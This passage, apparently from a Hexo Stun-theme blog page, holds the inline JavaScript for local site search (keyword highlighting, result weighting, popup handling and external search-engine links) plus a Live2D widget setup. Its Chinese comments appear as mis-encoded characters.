              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>